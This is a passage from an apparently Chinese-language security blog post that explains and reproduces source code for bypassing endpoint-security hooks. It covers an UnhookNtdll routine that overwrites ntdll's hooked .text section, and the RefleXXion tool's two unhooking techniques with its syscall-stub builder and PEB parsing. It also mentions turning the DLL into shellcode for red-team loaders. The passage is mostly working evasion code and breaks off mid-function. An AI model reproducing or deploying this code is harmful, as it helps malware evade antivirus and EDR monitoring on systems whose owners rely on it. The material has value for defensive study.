UnhookNtdll()找到新加载的ntdll.dll副本的.text段，并复制挂起的一个</span><br><span class="hljs-comment">    */</span><br>    DWORD oldprotect = <span class="hljs-number">0</span>;<br>    PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)pMapping;<br>    PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)((DWORD_PTR)pMapping + pidh-&gt;e_lfanew);<br>    <span class="hljs-type">int</span> i;<br><br><br>    <span class="hljs-comment">// find .text section</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; pinh-&gt;FileHeader.NumberOfSections; i++) &#123;<br>        PIMAGE_SECTION_HEADER pish = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pinh) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>((<span class="hljs-type">char</span>*)pish-&gt;Name, <span class="hljs-string">&quot;.text&quot;</span>)) &#123;<br>            <span class="hljs-comment">// prepare ntdll.dll memory region for write permissions.</span><br>            <span class="hljs-comment">// 为写权限准备ntdll.dll内存区域。</span><br>            VirtualProtect_p((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pish-&gt;VirtualAddress), pish-&gt;Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &amp;oldprotect);<br>            <span class="hljs-keyword">if</span> (!oldprotect) &#123;<br>                <span class="hljs-comment">// RWX failed!</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>            &#125;<br>            <span class="hljs-comment">// copy original .text section into ntdll memory</span><br>            <span class="hljs-built_in">memcpy</span>((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pish-&gt;VirtualAddress), (LPVOID)((DWORD_PTR)pMapping + (DWORD_PTR)pish-&gt;VirtualAddress), pish-&gt;Misc.VirtualSize);<br><br>            <span class="hljs-comment">// restore original protection settings of ntdll</span><br>            VirtualProtect_p((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pish-&gt;VirtualAddress), pish-&gt;Misc.VirtualSize, oldprotect, &amp;oldprotect);<br>            <span class="hljs-keyword">if</span> (!oldprotect) &#123;<br>                <span class="hljs-comment">// it failed</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>            &#125;<br>            <span class="hljs-comment">// all is good, time to go home</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// .text section not found?</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="RefleXXion"><a href="#RefleXXion" class="headerlink" title="RefleXXion"></a>RefleXXion</h2><p>它首先收集ldrptrunksignature数组中找到的NtOpenFile、NtCreateSection、NtOpenSection和NtMapViewOfSection的系统调用号。在此之后，用户可以选择两种技术来绕过用户模式钩子。</p><p>技术-1，从’ C:\Windows\System32\ NTDLL .dll ‘中读取NTDLL作为文件。解析之后，内存中已经加载的NTDLL(钩子在这里执行)的. text部分被替换为干净的NTDLL的. text部分。</p><p>在技术2中，NTDLL读取为knowndlls的Section\knowndls\NTDLL.dll。(因为DLL文件作为Section缓存在knownddll中。)解析之后，内存中已经加载的NTDLL(钩子在这里执行)的. text部分被替换为干净的NTDLL的.text部分。</p><p>&#x3D;&#x3D;RefleXXion只解钩NTDLL函数，你可能需要解钩其他dll (kernel32.dll, advapi32.dll等)。为此，您可以轻松地编辑项目中必要的位置。&#x3D;&#x3D;</p><p>*注:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">RefleXXion在干净安装的NTDLL上调用NtProtectVirtualMemory API。它为此使用CustomGetProcAddress函数，因为干净的NTDLL并不在InLoadOrderModuleList中，即使它被加载到内存中。所以像这里(https:<span class="hljs-regexp">//</span>stackoverflow.com<span class="hljs-regexp">/questions/</span><span class="hljs-number">6734095</span>/how-to-get-module-handle-from-<span class="hljs-keyword">func</span>-ptr-<span class="hljs-keyword">in</span>-win32)这样的解决方案是行不通的。这就是为什么存在并使用自定义GetProcAddress函数。*的原因<br>所以通过这篇文章https:<span class="hljs-regexp">//</span>revers.engineering<span class="hljs-regexp">/custom-getprocaddress-and-getmodulehandle-implementation-x64/</span>使用自定义的CustomGetProcAddress函数<br><br>*你可以从磁盘加载RefleXXion DLL到目标进程。你可能不喜欢像红队这样的敏感工作。因此，您可以使用sRDI项目将RefleXXion DLL转换为shell代码，或者将RefleXXion代码集成到您自己的加载器或项目中。<br><br>*即使NTDLL(作为文件或章节)被重新加载到注入进程中，它也不会保持加载状态。RefleXXion为自己的进程关闭所有打开的句柄(文件和段句柄)。<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202210031544610.png" alt="flow"></p><p>看看代码</p><p>先看看exe的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;psapi.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NT_SUCCESS(Status) ((NTSTATUS)(Status) &gt;= 0)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_SYSCALL_STUB_SIZE 64</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OBJ_CASE_INSENSITIVE 0x40</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> InitializeObjectAttributes( p, n, a, r, s ) &#123;   \</span><br><span class="hljs-meta">    (p)-&gt;Length = sizeof( OBJECT_ATTRIBUTES );          \</span><br><span class="hljs-meta">    (p)-&gt;RootDirectory = r;                             \</span><br><span class="hljs-meta">    (p)-&gt;Attributes = a;                                \</span><br><span class="hljs-meta">    (p)-&gt;ObjectName = n;                                \</span><br><span class="hljs-meta">    (p)-&gt;SecurityDescriptor = s;                        \</span><br><span class="hljs-meta">    (p)-&gt;SecurityQualityOfService = NULL;               \</span><br><span class="hljs-meta">    &#125;</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">void</span>* PRTL_USER_PROCESS_PARAMETERS;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">void</span>* PPS_POST_PROCESS_INIT_ROUTINE;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">UNICODE_STRING</span> &#123;</span><br>USHORT Length;<br>USHORT MaximumLength;<br>PWSTR  Buffer;<br>&#125; UNICODE_STRING, * RX_UNICODE_STRING;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">PEB_LDR_DATA</span> &#123;</span><br>DWORD dwLength;<br>DWORD dwInitialized;<br>LPVOID lpSsHandle;<br>LIST_ENTRY InLoadOrderModuleList;<br>LIST_ENTRY InMemoryOrderModuleList;<br>LIST_ENTRY InInitializationOrderModuleList;<br>LPVOID lpEntryInProgress;<br>&#125; PEB_LDR_DATA, * RX_PEB_LDR_DATA;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">PEB</span> &#123;</span><br>BYTE Reserved1[<span class="hljs-number">2</span>];<br>BYTE BeingDebugged;<br>BYTE Reserved2[<span class="hljs-number">1</span>];<br>PVOID Reserved3[<span class="hljs-number">2</span>];<br>RX_PEB_LDR_DATA Ldr;<br>PRTL_USER_PROCESS_PARAMETERS ProcessParameters;<br>PVOID Reserved4[<span class="hljs-number">3</span>];<br>PVOID AtlThunkSListPtr;<br>PVOID Reserved5;<br>ULONG Reserved6;<br>PVOID Reserved7;<br>ULONG Reserved8;<br>ULONG AtlThunkSListPtr32;<br>PVOID Reserved9[<span class="hljs-number">45</span>];<br>BYTE Reserved10[<span class="hljs-number">96</span>];<br>PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;<br>BYTE Reserved11[<span class="hljs-number">128</span>];<br>PVOID Reserved12[<span class="hljs-number">1</span>];<br>ULONG SessionId;<br>&#125; PEB, * RX_PEB;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>LIST_ENTRY InLoadOrderLinks;<br>LIST_ENTRY InMemoryOrderModuleList;<br>LIST_ENTRY InInitializationOrderModuleList;<br>PVOID DllBase;<br>PVOID EntryPoint;<br>ULONG SizeOfImage;<br>UNICODE_STRING FullDllName;<br>UNICODE_STRING BaseDllName;<br>ULONG Flags;<br>SHORT LoadCount;<br>SHORT TlsIndex;<br>LIST_ENTRY HashTableEntry;<br>ULONG TimeDateStamp;<br>&#125; LDR_DATA_TABLE_ENTRY, * RX_LDR_DATA_TABLE_ENTRY;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">OBJECT_ATTRIBUTES</span> &#123;</span><br>ULONG Length;<br>HANDLE RootDirectory;<br>RX_UNICODE_STRING ObjectName;<br>ULONG Attributes;<br>PVOID SecurityDescriptor;        <span class="hljs-comment">// Points to type SECURITY_DESCRIPTOR</span><br>PVOID SecurityQualityOfService;  <span class="hljs-comment">// Points to type SECURITY_QUALITY_OF_SERVICE</span><br><br>&#125; OBJECT_ATTRIBUTES, * RX_OBJECT_ATTRIBUTES;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_STATUS_BLOCK</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>NTSTATUS Status;<br>PVOID Pointer;<br>&#125;;<br>ULONG_PTR Information;<br>&#125; IO_STATUS_BLOCK, * RX_IO_STATUS_BLOCK;<br><br><span class="hljs-comment">// NtOpenFile  NtOpenFile 例程打开现有文件、目录、设备或卷。</span><br><span class="hljs-keyword">typedef</span> NTSYSAPI <span class="hljs-title function_">NTSTATUS</span><span class="hljs-params">(NTAPI* RX_NtOpenFile)</span><span class="hljs-params">(PHANDLE, ACCESS_MASK, RX_OBJECT_ATTRIBUTES, RX_IO_STATUS_BLOCK, ULONG, ULONG)</span>;<br><br><span class="hljs-comment">// NtCreateSection  NtCreateSection 例程创建节对象。</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">NTSTATUS</span><span class="hljs-params">(NTAPI* RX_NtCreateSection)</span><span class="hljs-params">(PHANDLE, ACCESS_MASK, RX_OBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE)</span>;<br><br><span class="hljs-comment">// NtOpenSection  打开内核对象</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">NTSTATUS</span><span class="hljs-params">(NTAPI* RX_NtOpenSection)</span><span class="hljs-params">(HANDLE*, ACCESS_MASK, OBJECT_ATTRIBUTES*)</span>;<br><br><span class="hljs-comment">// NtMapViewOfSection MapViewOfSection 驱动注入 这是一个这样的实现 DLL 注射驱动程序 比如当 UnserMode 进程加载 UrlMon.dll 时,抢先加载自 己的 DLL(UrlMonEye.dll)</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">NTSTATUS</span><span class="hljs-params">(NTAPI* RX_NtMapViewOfSection)</span><span class="hljs-params">(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG)</span>;<br><br><span class="hljs-comment">// NtProtectVirtualMemory   顾名思义</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">NTSTATUS</span><span class="hljs-params">(NTAPI* _NtProtectVirtualMemory)</span><span class="hljs-params">(HANDLE, PVOID, PSIZE_T, ULONG, PULONG)</span>;<br><br><span class="hljs-comment">// NtUnmapViewOfSection 确实可以卸载指定进程指定位置的模块 但是在ring3下不稳定 最好在ring0</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">NTSTATUS</span><span class="hljs-params">(NTAPI* _NtUnmapViewOfSection)</span><span class="hljs-params">(HANDLE, PVOID)</span>;<br><br><span class="hljs-comment">// RtlInitUnicodeString  初始化 Unicode 字符的计数字符串。</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">VOID</span><span class="hljs-params">(NTAPI* _RtlInitUnicodeString)</span><span class="hljs-params">(RX_UNICODE_STRING, PCWSTR)</span>;<br><br><span class="hljs-comment">// Needed for Technique - 1 (Reading NTDLL From Disk)   技术一的时候用到了RXnetopenfile和Rxntcreatesection</span><br>RX_NtOpenFile RxNtOpenFile = <span class="hljs-literal">NULL</span>;<br>RX_NtCreateSection RxNtCreateSection = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-comment">// Needed for Technique - 2 (Reading NTDLL From KnownDlls)  技术二用到RxNtOpenSection</span><br>RX_NtOpenSection RxNtOpenSection = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-comment">// Needed for Both Technique - 1 and Technique - 2   两个都要的话</span><br>RX_NtMapViewOfSection RxNtMapViewOfSection = <span class="hljs-literal">NULL</span>;<br><br>ULONG_PTR <span class="hljs-title function_">BuildSyscallStub</span><span class="hljs-params">(ULONG_PTR pStubRegion, DWORD dwSyscallNo)</span> &#123;<br><span class="hljs-comment">//建立syscall存根</span><br>BYTE bSyscallStub[] = &#123;<br><span class="hljs-number">0x4c</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0xd1</span>,<span class="hljs-comment">// mov     r10,rcx</span><br><span class="hljs-number">0xb8</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<span class="hljs-comment">// mov     eax,xxx</span><br><span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>,<span class="hljs-comment">// syscall</span><br><span class="hljs-number">0xc3</span><span class="hljs-comment">// ret</span><br>&#125;;<br><br><span class="hljs-built_in">memcpy</span>((PBYTE)pStubRegion, bSyscallStub, <span class="hljs-keyword">sizeof</span>(bSyscallStub));<br><span class="hljs-comment">//内存拷贝</span><br>*(DWORD*)(pStubRegion + <span class="hljs-number">4</span>) = dwSyscallNo;<br><br><span class="hljs-keyword">return</span> pStubRegion;<br>&#125;<br><br>BOOL <span class="hljs-title function_">InitSyscallsFromLdrpThunkSignature</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-comment">// 函数名顾名思义就说获取到syscall存根。</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Parsing(解析) LdrpThunkSignature For Clean Syscalls.\n\n&quot;</span>);<br><br>RX_PEB pPEB = (RX_PEB)__readgsqword(<span class="hljs-number">0x60</span>);<br>RX_PEB_LDR_DATA pPEBLdr = pPEB-&gt;Ldr;<br>RX_LDR_DATA_TABLE_ENTRY pLdeNTDLL = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">for</span> (RX_LDR_DATA_TABLE_ENTRY pLdeTmp = (RX_LDR_DATA_TABLE_ENTRY)pPEBLdr-&gt;InLoadOrderModuleList.Flink; pLdeTmp-&gt;DllBase != <span class="hljs-literal">NULL</span>; pLdeTmp = (RX_LDR_DATA_TABLE_ENTRY)pLdeTmp-&gt;InLoadOrderLinks.Flink) &#123;<br><span class="hljs-keyword">if</span> (_wcsnicmp(pLdeTmp-&gt;BaseDllName.Buffer, <span class="hljs-string">L&quot;ntdll.dll&quot;</span>, <span class="hljs-number">9</span>) == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">//wcsnicmp比较两个字符串中指定数目的字符（不考虑大小写）。</span><br><span class="hljs-comment">// We Detect NTDLL</span><br><span 